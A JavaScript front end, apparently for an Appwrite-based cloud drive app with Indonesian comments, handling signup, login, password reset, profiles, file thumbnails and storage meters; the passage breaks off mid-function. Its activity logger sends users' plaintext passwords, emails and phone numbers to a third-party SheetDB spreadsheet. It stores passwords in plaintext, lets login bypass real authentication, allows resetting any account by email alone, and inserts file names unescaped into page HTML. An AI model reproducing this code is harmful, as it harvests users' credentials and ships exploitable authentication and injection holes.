// ======================================================
// 1. KONFIGURASI APPWRITE & GLOBAL
// ======================================================
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI AVATAR (Solusi Masalah Validasi URL vs File Lokal)
const DEFAULT_AVATAR_LOCAL = 'profile-default.jpeg'; 
const DEFAULT_AVATAR_DB_URL = 'https://cloud.appwrite.io/v1/storage/buckets/default/files/default/view';

// KONFIGURASI PROJECT (SESUAIKAN DENGAN PROJECT ANDA)
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

// API SheetDB untuk Pencatatan Log Aktivitas User ke Excel
const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi'; 

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// State Global Aplikasi
let currentUser = null;
let userDataDB = null; 
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root'; 
let selectedItem = null; 
let selectedUploadFile = null; 
let selectedProfileImage = null; 
let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
let searchTimeout = null;

// STATE PREVIEW NAVIGATION (Baru untuk Media Gallery)
let currentPreviewList = [];

// Helper DOM untuk mempersingkat pemanggilan elemen
const el = (id) => document.getElementById(id);

// Fungsi Loading Global
const toggleLoading = (show, msg = "Memproses...") => {
    const loader = el('loading');
    const text = el('loadingText');
    if (show) {
        if(text) text.innerText = msg;
        if(loader) loader.classList.remove('hidden');
    } else {
        if(loader) loader.classList.add('hidden');
    }
};

// ======================================================
// 2. MAIN EXECUTION (Saat Halaman Dimuat)
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    checkSession(); // Cek sesi login
    initDragAndDrop(); // Setup drag-drop upload
    initLogout(); // Setup tombol logout
    initSearchBar(); // Setup pencarian
    initAllContextMenus(); // Setup klik kanan
    initStorageTooltip(); // Setup tooltip storage
    initProfileImageUploader(); // Setup upload profil
});

// ======================================================
// 3. FUNGSI LOGGING KE EXCEL (SHEETDB)
// ======================================================
async function recordActivity(sheetName, data) {
    try {
        const now = new Date().toLocaleString('id-ID', {
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).replace(/\./g, ':'); 

        let payload = {};

        if (sheetName === 'SignUp') {
            payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Phone": data.phone || "-", "Password": data.password || "-", "Waktu": now };
        } else if (sheetName === 'Login') {
            payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Password": data.password || "-", "Riwayat Waktu": now };
        } else if (sheetName === 'Logout') {
            payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Riwayat Waktu": now };
        }

        await fetch(`${SHEETDB_API}?sheet=${sheetName}`, {
            method: 'POST',
            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: payload })
        });
    } catch (error) { console.error("System Log Error:", error); }
}

function checkSystemHealth() {
    if (!navigator.onLine) throw new Error("Tidak ada koneksi internet. Periksa jaringan Anda.");
    return true;
}

// ======================================================
// 4. LOGIKA AUTH (SIGN UP, LOGIN, LOGOUT, RESET)
// ======================================================

if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value.trim(); const email = el('regEmail').value.trim();
        const phone = el('regPhone').value.trim(); const pass = el('regPass').value; const verify = el('regVerify').value;

        if (pass !== verify) return alert("Konfirmasi password tidak cocok!");
        toggleLoading(true, "Mendaftarkan Akun Anda...");
        try {
            checkSystemHealth();
            const newUserId = Appwrite.ID.unique(); 
            await account.create(newUserId, email, pass, name);
            try { await account.createEmailPasswordSession(email, pass); } catch(e) {}
            try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, newUserId, { email: email, phone: phone, name: name, password: pass, avatarUrl: DEFAULT_AVATAR_DB_URL }); } catch (dbError) {}
            recordActivity('SignUp', { id: newUserId, name: name, email: email, phone: phone, password: pass }).catch(e => {});
            try { await account.deleteSession('current'); } catch (e) {}
            toggleLoading(false); alert("Pendaftaran Berhasil Sempurna!\nSilakan Login dengan akun baru Anda."); window.nav('loginPage');
        } catch(e) { toggleLoading(false); alert("Error Pendaftaran: " + e.message); }
    });
}

if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let inputId = el('loginEmail').value.trim(); const pass = el('loginPass').value;
        try {
            toggleLoading(true, "Mengecek Kredensial..."); checkSystemHealth();
            if (!inputId.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [ Appwrite.Query.equal('name', inputId) ]);
                if (res.documents.length > 0) inputId = res.documents[0].email; else throw new Error("Username tidak ditemukan di database.");
            }
            let dbUser = null;
            const userCheck = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [ Appwrite.Query.equal('email', inputId) ]);
            if (userCheck.documents.length > 0) {
                dbUser = userCheck.documents[0];
                if (dbUser.password && dbUser.password !== pass && dbUser.password !== 'NULL') throw new Error("Password Anda salah.");
            } else { throw new Error("Akun tidak ditemukan."); }

            toggleLoading(true, "Menyiapkan Sesi Dashboard...");
            let authSuccess = false;
            try { await account.createEmailPasswordSession(inputId, pass); authSuccess = true; } catch (authErr) {}
            let user = authSuccess ? await account.get() : { $id: dbUser.$id, name: dbUser.name, email: dbUser.email, phone: dbUser.phone };
            if (authSuccess) await syncUserData(user); 
            recordActivity('Login', { id: user.$id, name: user.name, email: user.email, password: pass }).catch(e => {});
            await initializeDashboard(user); 
        } catch (error) { toggleLoading(false); alert("Login Gagal: " + error.message); }
    });
}

function initLogout() {
    const btn = el('logoutBtn');
    if (btn) {
        const newBtn = btn.cloneNode(true); btn.parentNode.replaceChild(newBtn, btn);
        newBtn.addEventListener('click', async () => {
            if (confirm("Yakin ingin keluar dari Drive?")) {
                toggleLoading(true, "Mengakhiri Sesi...");
                if (currentUser) await recordActivity('Logout', { id: currentUser.$id, name: currentUser.name, email: currentUser.email });
                try { await account.deleteSession('current'); } catch (error) {}
                window.location.reload(); 
            }
        });
    }
}

if (el('resetForm')) {
    el('resetForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = el('resetEmail').value.trim(); const newPass = el('resetNewPass').value; const verifyPass = el('resetVerifyPass').value;
        if (newPass !== verifyPass) return alert("Konfirmasi password tidak cocok!"); if (newPass.length < 8) return alert("Password minimal 8 karakter.");
        toggleLoading(true, "Mencari Akun...");
        try {
            const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [ Appwrite.Query.equal('email', email) ]);
            if (res.documents.length === 0) throw new Error("Email tidak ditemukan di database.");
            const userDoc = res.documents[0];
            await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userDoc.$id, { password: newPass });
            await fetch(`${SHEETDB_API}/Email/${email}?sheet=SignUp`, { method: 'PATCH', headers: {'Accept': 'application/json', 'Content-Type': 'application/json'}, body: JSON.stringify({ "data": { "Password": newPass } }) });
            await fetch(`${SHEETDB_API}/Email/${email}?sheet=Login`, { method: 'PATCH', headers: {'Accept': 'application/json', 'Content-Type': 'application/json'}, body: JSON.stringify({ "data": { "Password": newPass } }) });
            toggleLoading(false); alert("Berhasil! Password telah diperbarui."); window.nav('loginPage');
        } catch (error) { toggleLoading(false); alert("Gagal Reset: " + error.message); }
    });
}

// ======================================================
// 5. HELPER DATA & SINKRONISASI
// ======================================================
async function syncUserData(authUser) {
    if (!authUser) return;
    try {
        let userDoc;
        try { userDoc = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id); } catch (e) { if (e.code === 404) userDoc = null; }
        const payload = { name: authUser.name, email: authUser.email };
        if (!userDoc) { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id, { ...payload, phone: '', password: 'NULL', avatarUrl: DEFAULT_AVATAR_DB_URL }); } 
        else if (!userDoc.name || userDoc.name !== authUser.name) { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id, payload); }
    } catch (err) { console.error("Sync Error:", err); }
}

async function initializeDashboard(userObj) {
    currentUser = userObj;
    const dbPromise = databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id)
        .then(doc => { userDataDB = doc; })
        .catch(() => { userDataDB = { phone: '', avatarUrl: DEFAULT_AVATAR_DB_URL }; });
    const filePromise = loadFiles('root');
    const storagePromise = calculateStorage();
    await Promise.all([dbPromise, filePromise, storagePromise]);
    updateProfileUI(); window.nav('dashboardPage'); toggleLoading(false); 
}

async function checkSession() {
    if(!el('loginPage').classList.contains('hidden')) return;
    toggleLoading(true, "Memuat Sesi Terakhir...");
    try {
        currentUser = await account.get();
        await syncUserData(currentUser);
        try { userDataDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id); } catch (e) { userDataDB = { phone: '', avatarUrl: DEFAULT_AVATAR_DB_URL }; }
        updateProfileUI(); window.nav('dashboardPage'); loadFiles('root'); calculateStorage();
    } catch (e) { window.nav('loginPage'); } finally { toggleLoading(false); }
}

function updateProfileUI() {
    const dbUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : '';
    let finalSrc;
    if (!dbUrl || dbUrl === DEFAULT_AVATAR_DB_URL || dbUrl === 'NULL') { finalSrc = DEFAULT_AVATAR_LOCAL; } 
    else { finalSrc = dbUrl + `&t=${new Date().getTime()}`; } 
    if(el('dashAvatar')) el('dashAvatar').src = finalSrc;
    if(el('storagePageAvatar')) el('storagePageAvatar').src = finalSrc;
    if(el('editProfileImg')) el('editProfileImg').src = finalSrc;
}

window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage', 'storagePage', 'profilePage', 'resetPage'].forEach(id => { const element = el(id); if(element) element.classList.add('hidden'); });
    const target = el(pageId); if(target) target.classList.remove('hidden');
};

// ======================================================
// 6. PROFILE & SETTINGS
// ======================================================
window.openProfilePage = () => {
    if (!currentUser) return;
    el('editName').value = currentUser.name || ''; el('editEmail').value = currentUser.email || '';
    el('editPhone').value = (userDataDB && userDataDB.phone) ? userDataDB.phone : ''; el('editPass').value = ''; 
    updateProfileUI(); selectedProfileImage = null; window.nav('profilePage');
};

function initProfileImageUploader() {
    const input = el('profileUploadInput');
    if(input) {
        input.addEventListener('change', (e) => {
            if(e.target.files.length > 0) {
                const file = e.target.files[0]; selectedProfileImage = file;
                const reader = new FileReader(); reader.onload = function(evt) { el('editProfileImg').src = evt.target.result; }; reader.readAsDataURL(file);
            }
        });
    }
}

window.saveProfile = async () => {
    toggleLoading(true, "Menyimpan Perubahan Profil...");
    try {
        const newName = el('editName').value.trim(); const newEmail = el('editEmail').value.trim();
        const newPhone = el('editPhone').value.trim(); const newPass = el('editPass').value;
        let newAvatarUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : DEFAULT_AVATAR_DB_URL;
        
        if (selectedProfileImage) {
            const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedProfileImage);
            newAvatarUrl = storage.getFileView(CONFIG.BUCKET_ID, up.$id).href;
        }

        if (newName && newName !== currentUser.name) await account.updateName(newName);
        if (newEmail && newEmail !== currentUser.email) { try { await account.updateEmail(newEmail, ''); } catch(e) {} }
        if (newPass) await account.updatePassword(newPass);

        const payload = { name: newName, email: newEmail, phone: newPhone, avatarUrl: newAvatarUrl }; if(newPass) payload.password = newPass;

        try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, payload); } 
        catch (dbErr) { if (dbErr.code === 404) await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, payload); }

        if (!userDataDB) userDataDB = {};
        userDataDB.phone = newPhone; userDataDB.avatarUrl = newAvatarUrl;

        currentUser = await account.get(); updateProfileUI(); toggleLoading(false); alert("Profil Berhasil Disimpan!"); window.nav('dashboardPage');
    } catch (error) { toggleLoading(false); alert("Gagal Menyimpan: " + error.message); }
};

// ======================================================
// 7. FILE MANAGER LOGIC & THUMBNAIL GOOGLE DRIVE
// ======================================================

// UPDATE PREVIEW LIST UNTUK GALERI NAVIGASI
function updatePreviewList(documentsArray) {
    currentPreviewList = documentsArray.filter(d => d.type === 'file' && !d.trashed);
}

window.handleMenuClick = (element, mode) => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); element.classList.add('active');
    currentFolderId = 'root'; currentViewMode = mode;
    if(mode === 'root') currentFolderName = "Drive";
    else if(mode === 'recent') currentFolderName = "Terbaru";
    else if(mode === 'starred') currentFolderName = "Berbintang";
    else if(mode === 'trash') currentFolderName = "Sampah";
    else currentFolderName = element.innerText.trim();
    loadFiles(mode);
};

window.goBack = () => {
    currentFolderId = 'root'; currentFolderName = "Drive"; currentViewMode = 'root';
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.nav-item')[0].classList.add('active'); loadFiles('root');
};

window.openFolder = (id, name) => { currentFolderId = id; currentFolderName = name; loadFiles(id); };

function initSearchBar() {
    const input = el('searchInput'); if (!input) return;
    input.addEventListener('input', (e) => {
        const query = e.target.value.trim();
        if (query.length === 0) { el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); return; }
        el('clearSearchBtn').classList.remove('hidden'); clearTimeout(searchTimeout);
        el('fileGrid').innerHTML = `<div style="grid-column:1/-1;text-align:center;margin-top:50px;"><div class="spinner"></div><p>Mencari "${query}"...</p></div>`;
        searchTimeout = setTimeout(() => performSearch(query), 600);
    });
}

async function performSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [ Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.search('name', keyword), Appwrite.Query.limit(50) ]);
        const grid = el('fileGrid'); grid.innerHTML = '';
        updatePreviewList(res.documents); // Update untuk Gallery Mode
        if (res.documents.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;">Tidak ditemukan.</p>`; else res.documents.forEach(doc => renderItem(doc));
    } catch (e) { fallbackSearch(keyword); }
}

async function fallbackSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.limit(100)]);
        const filtered = res.documents.filter(doc => doc.name.toLowerCase().includes(keyword.toLowerCase()));
        const grid = el('fileGrid'); grid.innerHTML = '';
        updatePreviewList(filtered); // Update untuk Gallery Mode
        if (filtered.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;">Tidak ditemukan.</p>`; else filtered.forEach(doc => renderItem(doc));
    } catch(err){}
}

window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); };

function renderItem(doc) {
    const grid = el('fileGrid'); 
    const div = document.createElement('div'); div.className = 'item-card';

    const isFolder = doc.type === 'folder';
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:10px;left:10px;color:#ffd700;z-index:15;text-shadow:0 0 5px rgba(0,0,0,0.5);"></i>` : '';
    let content = '';

    if (isFolder) {
        content = `
            <div class="thumb-box" style="background:transparent; overflow: visible;">
                <div class="mac-folder-container">
                    <div class="mac-folder-icon"><div class="mac-folder-back"></div><div class="mac-folder-front"></div></div>
                </div>
            </div>`;
    } else {
        const ext = doc.name.split('.').pop().toLowerCase();
        const fileViewUrl = storage.getFileView(CONFIG.BUCKET_ID, doc.fileId).href || storage.getFileView(CONFIG.BUCKET_ID, doc.fileId);

        const familiarImages = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'tif', 'heif', 'heic', 'raw', 'cr2', 'nef', 'orf', 'arw', 'dng', 'jfif', 'pjp', 'pjpeg', 'webp', 'svg', 'ico'];
        const vidExts = ['mp4', 'webm', 'ogg', 'mov', 'mkv', 'avi', 'wmv', 'flv', '3gp', 'mpg', 'mpeg', 'avchd', 'm2ts'];
        const docExts = ['doc', 'docx', 'xls', 'xlsx', 'csv', 'ppt', 'pptx'];
        const pdfExt = ['pdf'];

        const createFallback = (ext) => {
            let iconClass = "fa-file"; let colorClass = "icon-grey"; let bgClass = "bg-grey";
            if (['psd', 'indd', 'tiff', 'tif', 'ai', 'eps', 'pdf'].includes(ext)) { if(ext === 'pdf') { iconClass = "fa-file-pdf"; colorClass = "icon-red"; bgClass = "bg-red"; } else if(['psd', 'indd'].includes(ext)) { iconClass = "fa-file-image"; colorClass = "icon-blue"; bgClass = "bg-blue"; } else { iconClass = "fa-pen-nib"; colorClass = "icon-orange"; bgClass = "bg-orange"; } }
            else if (ext.includes('doc')) { iconClass = "fa-file-word"; colorClass = "icon-blue"; bgClass = "bg-blue"; } else if (ext.includes('xls') || ext.includes('csv')) { iconClass = "fa-file-excel"; colorClass = "icon-green"; bgClass = "bg-green"; } else if (ext.includes('ppt')) { iconClass = "fa-file-powerpoint"; colorClass = "icon-orange"; bgClass = "bg-orange"; } else if (['html', 'css', 'js', 'php'].includes(ext)) { iconClass = "fa-file-code"; colorClass = "icon-grey"; bgClass = "bg-grey"; } else if (['zip', 'rar'].includes(ext)) { iconClass = "fa-file-zipper"; colorClass = "icon-yellow"; bgClass = "bg-yellow"; }
            return `<div class="thumb-fallback-card ${bgClass}"><i class="icon fa-solid ${iconClass} huge-icon ${colorClass}"></i><span class="fallback-ext">${ext.toUpperCase()}</span></div>`.replace(/"/g, "'"); 
        };

        if (familiarImages.includes(ext)) {
            content = `<div class="thumb-box thumb-box-file"><img src="${fileViewUrl}" class="thumb-image" loading="lazy" onerror="this.parentElement.innerHTML='${createFallback(ext)}'"></div>`;
        } else if (vidExts.includes(ext)) {
            content = `<div class="thumb-box thumb-box-file" style="background:#000;"><video src="${fileViewUrl}" class="thumb-video" preload="metadata" muted loop onmouseover="this.play()" onmouseout="this.pause()" onerror="this.parentElement.innerHTML='${createFallback(ext)}'"></video><i class="fa-solid fa-play" style="position:absolute; color:rgba(255,255,255,0.8); font-size:1.5rem; pointer-events:none;"></i></div>`;
        } else if (docExts.includes(ext) || pdfExt.includes(ext)) {
            const backendThumbUrl = `https://bizar8-api-thumbnail-drive.hf.space/api/thumbnail?url=${encodeURIComponent(fileViewUrl)}&ext=${ext}`;
            let badgeIcon = "fa-file"; let badgeColor = "#ffffff";
            if (pdfExt.includes(ext)) { badgeIcon = "fa-file-pdf"; badgeColor = "#ea4335"; }
            else if (ext.includes('doc')) { badgeIcon = "fa-file-word"; badgeColor = "#4285f4"; }
            else if (ext.includes('xls') || ext.includes('csv')) { badgeIcon = "fa-file-excel"; badgeColor = "#34a853"; }
            else if (ext.includes('ppt')) { badgeIcon = "fa-file-powerpoint"; badgeColor = "#fbbc04"; }

            content = `
                <div class="thumb-box thumb-box-file" style="background:#f8f9fa; position: relative;">
                    <img src="${backendThumbUrl}" class="thumb-image" loading="lazy" onerror="this.parentElement.innerHTML='${createFallback(ext)}'" style="object-fit: cover;">
                    <div style="position: absolute; bottom: 6px; right: 6px; background: rgba(255,255,255,0.95); padding: 5px 7px; border-radius: 6px; display: flex; align-items: center; justify-content: center; z-index: 11; box-shadow: 0 2px 6px rgba(0,0,0,0.15);">
                        <i class="fa-solid ${badgeIcon}" style="font-size: 1.1rem; color: ${badgeColor};"></i>
                    </div>
                </div>
            `;
        } else {
            content = `<div class="thumb-box thumb-box-file">${createFallback(ext).replace(/'/g, '"')}</div>`;
        }
    }

    div.innerHTML = `${starHTML}${content}<div class="item-name" title="${doc.name}">${doc.name}</div>`;
    div.onclick = () => { if(!doc.trashed) { isFolder ? openFolder(doc.$id, doc.name) : openPreview(doc); } };
    
    div.oncontextmenu = (e) => {
        e.preventDefault(); e.stopPropagation();
        closeAllMenus(); selectedItem = doc;
        const menu = el('fileContextMenu');
        
        ['ctxBtnOpenFolder', 'ctxBtnPreview', 'ctxBtnDownload', 'ctxBtnOpenWith'].forEach(id => {
            const btn = el(id);
            if (btn) {
                if ((isFolder && id === 'ctxBtnOpenFolder') || (!isFolder && id !== 'ctxBtnOpenFolder')) { btn.style.display = 'flex'; } 
                else { btn.style.display = 'none'; }
            }
        });

        menu.style.top = `${e.clientY}px`; menu.style.left = `${e.clientX}px`;
        
        const isTrash = doc.trashed;
        el('ctxTrashBtn').classList.toggle('hidden', isTrash);
        el('ctxRestoreBtn').classList.toggle('hidden', !isTrash);
        el('ctxPermDeleteBtn').classList.toggle('hidden', !isTrash);
        el('ctxStarText').innerText = doc.starred ? "Hapus Bintang" : "Bintangi";

        menu.classList.remove('hidden'); menu.classList.add('show');
    };

    grid.appendChild(div);
}

function closeAllMenus() {
    if(el('storageModal')) el('storageModal').classList.add('hidden');
    if(el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
    if(el('dropdownNewMenu')) el('dropdownNewMenu').classList.remove('show');
    if(el('fileContextMenu')) { el('fileContextMenu').classList.add('hidden'); el('fileContextMenu').classList.remove('show'); }
}

function initAllContextMenus() {
    const newBtn = el('newBtnMain'); const newMenu = el('dropdownNewMenu'); 
    const navDrive = el('navDrive'); const globalMenu = el('globalContextMenu'); const mainArea = document.querySelector('.main-content-area');

    if (newBtn) {
        const newBtnClean = newBtn.cloneNode(true); newBtn.parentNode.replaceChild(newBtnClean, newBtn);
        const toggleNewMenu = (e) => { e.preventDefault(); e.stopPropagation(); const wasOpen = newMenu.classList.contains('show'); closeAllMenus(); if (!wasOpen) newMenu.classList.add('show'); };
        newBtnClean.onclick = toggleNewMenu; newBtnClean.oncontextmenu = toggleNewMenu;
    }

    if (navDrive) {
        navDrive.oncontextmenu = (e) => { e.preventDefault(); e.stopPropagation(); closeAllMenus(); globalMenu.style.top = `${e.clientY}px`; globalMenu.style.left = `${e.clientX}px`; globalMenu.classList.add('show'); };
    }

    if (mainArea) {
        mainArea.oncontextmenu = (e) => {
            if (e.target.closest('.item-card')) return;
            e.preventDefault(); closeAllMenus();
            globalMenu.style.top = `${e.clientY}px`; globalMenu.style.left = `${e.clientX}px`; globalMenu.classList.add('show');
        };
    }
    
    window.onclick = (e) => {
        if (e.target.closest('.modal-box') || e.target.closest('.storage-widget') || e.target.closest('.preview-header-right')) return;
        closeAllMenus();
        if(el('previewContextMenu')) el('previewContextMenu').classList.add('hidden');
    };
}

// ======================================================
// 8. STORAGE LOGIC & MODAL
// ======================================================
function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024; const sizes = ['B', 'KB', 'MB', 'GB', 'TB']; const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function initStorageTooltip() {
    const segments = document.querySelectorAll('.bar-segment');
    const tooltip = el('customTooltip');
    const ttHeader = el('ttHeader');
    const ttSize = el('ttSize');
    const ttDesc = el('ttDesc');

    segments.forEach(seg => {
        seg.addEventListener('mouseenter', (e) => {
            const cat = e.target.getAttribute('data-category'); const size = e.target.getAttribute('data-size');
            const formattedSize = formatSize(parseInt(size || 0));

            ttHeader.innerText = cat || "LAINNYA"; ttSize.innerText = formattedSize;
            if (cat === 'GAMBAR') ttDesc.innerText = "Foto dan gambar yang tersimpan.";
            else if (cat === 'VIDEO') ttDesc.innerText = "Video dan rekaman yang tersimpan.";
            else if (cat === 'DOKUMEN') ttDesc.innerText = "Dokumen PDF, Word, Excel.";
            else if (cat === 'TERSEDIA') ttDesc.innerText = "Sisa penyimpanan yang tersedia.";
            else ttDesc.innerText = "File lain yang tidak dikategorikan.";
            tooltip.classList.remove('hidden');
        });

        seg.addEventListener('mousemove', (e) => { tooltip.style.left = `${e.clientX}px`; tooltip.style.top = `${e.clientY - 15}px`; });
        seg.addEventListener('mouseleave', () => { tooltip.classList.add('hidden'); });
    });
}

window.openStoragePage = async () => {
    await calculateStorage();
    window.closeModal('storageModal'); window.nav('storagePage');

    const totalBytes = storageDetail.total || 0; const limitBytes = 2 * 1024 * 1024 * 1024; 
    
    const percentUsed = Math.min((totalBytes / limitBytes) * 100, 100).toFixed(0);
    el('pageStoragePercent').innerText = `Ruang penyimpanan ${percentUsed}% penuh`;
    el('pageStorageUsedText').innerText = `${formatSize(totalBytes)} dari 2 GB`;

    const pctImages = (storageDetail.images / limitBytes) * 100; const pctVideos = (storageDetail.videos / limitBytes) * 100;
    const pctDocs = (storageDetail.docs / limitBytes) * 100; const pctOthers = (storageDetail.others / limitBytes) * 100;
    const pctFree = 100 - (pctImages + pctVideos + pctDocs + pctOthers);

    const barImg = el('pageBarImages'); const barVid = el('pageBarVideos'); const barDoc = el('pageBarDocs'); const barOth = el('pageBarOthers'); const barFree = el('pageBarFree');

    barImg.style.width = `${pctImages}%`; barVid.style.width = `${pctVideos}%`; barDoc.style.width = `${pctDocs}%`; barOth.style.width = `${pctOthers}%`; barFree.style.width = `${pctFree}%`;

    barImg.setAttribute('data-category', 'GAMBAR'); barImg.setAttribute('data-size', storageDetail.images);
    barVid.setAttribute('data-category', 'VIDEO'); barVid.setAttribute('data-size', storageDetail.videos);
    barDoc.setAttribute('data-category', 'DOKUMEN'); barDoc.setAttribute('data-size', storageDetail.docs);
    barOth.setAttribute('data-category', 'LAINNYA'); barOth.setAttribute('data-size', storageDetail.others);
    barFree.setAttribute('data-category', 'TERSEDIA'); barFree.setAttribute('data-size', limitBytes - totalBytes);

    el('pageValImages').innerText = formatSize(storageDetail.images); el('pageValVideos').innerText = formatSize(storageDetail.videos);
    el('pageValDocs').innerText = formatSize(storageDetail.docs); el('pageValOthers').innerText = formatSize(storageDetail.others);
    el('pageValFree').innerText = formatSize(limitBytes - totalBytes);
    initStorageTooltip();
};

window.closeStoragePage = () => { window.nav('dashboardPage'); };

window.openStorageModal = async () => {
    closeAllMenus();
    await calculateStorage();
    const totalBytes = storageDetail.total || 0; const limitBytes = 2 * 1024 * 1024 * 1024; 

    el('storageBigText').innerText = formatSize(totalBytes);
    const pctImages = (storageDetail.images / limitBytes) * 100; const pctVideos = (storageDetail.videos / limitBytes) * 100;
    const pctDocs = (storageDetail.docs / limitBytes) * 100; const pctOthers = (storageDetail.others / limitBytes) * 100;
    const pctFree = 100 - (pctImages + pctVideos + pctDocs + pctOthers);

    const barImg = el('barImages'); const barVid = el('barVideos'); const barDoc = el('barDocs'); const barOth = el('barOthers'); const barFree = el('barFree');

    barImg.style.width = `${pctImages}%`; barVid.style.width = `${pctVideos}%`; barDoc.style.width = `${pctDocs}%`; barOth.style.width = `${pctOthers}%`; barFree.style.width = `${pctFree}%`;

    barImg.setAttribute('data-category', 'GAMBAR'); barImg.setAttribute('data-size', storageDetail.images);
    barVid.setAttribute('data-category', 'VIDEO'); barVid.setAttribute('data-size', storageDetail.videos);
    barDoc.setAttribute('data-category', 'DOKUMEN'); barDoc.setAttribute('data-size', storageDetail.docs);
    barOth.setAttribute('data-category', 'LAINNYA'); barOth.setAttribute('data-size', storageDetail.others);
    barFree.setAttribute('data-category', 'TERSEDIA'); barFree.setAttribute('data-size', limitBytes - totalBytes);

    el('valImages').innerText = formatSize(storageDetail.images); el('valVideos').innerText = formatSize(storageDetail.videos);
    el('valDocs').innerText = formatSize(storageDetail.docs); el('valOthers').innerText = formatSize(storageDetail.others);

    const modalBox = el('storageModal').querySelector('.modal-box');
    modalBox.classList.remove('animate-open'); void modalBox.offsetWidth; modalBox.classList.add('animate-open');
    window.openModal('storageModal');
};

async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [ Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file') ]);
        
        storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 }; const limit = 2 * 1024 * 1024 * 1024; 

        res.documents.forEach(doc => {
            const size = doc.size || 0; const name = doc.name.toLowerCase(); storageDetail.total += size;
            if (name.match(/\.(jpg|jpeg|png|gif|webp|jfif|svg|bmp|tiff|tif|heif|heic|raw|ico)$/)) storageDetail.images += size;
            else if (name.match(/\.(mp4|mkv|mov|avi|wmv|flv|webm|3gp|mpg|mpeg|avchd|m2ts)$/)) storageDetail.videos += size;
            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|rtf|csv|odt|ods|odp)$/)) storageDetail.docs += size;
            else storageDetail.others += size;
        });

        el('storageUsed').innerText = formatSize(storageDetail.total);
        const totalPct = Math.min((storageDetail.total / limit) * 100, 100);
        el('storageBar').style.width = `${totalPct}%`;
        if(totalPct > 90) el('storageBar').style.backgroundColor = '#ef4444'; else el('storageBar').style.backgroundColor = '';
    } catch (e) { console.error("Gagal hitung storage:", e); }
}

window.openModal = (id) => { el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
window.createFolder = () => window.openModal('folderModal');

window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim(); if (!name) return; closeModal('folderModal'); toggleLoading(true);
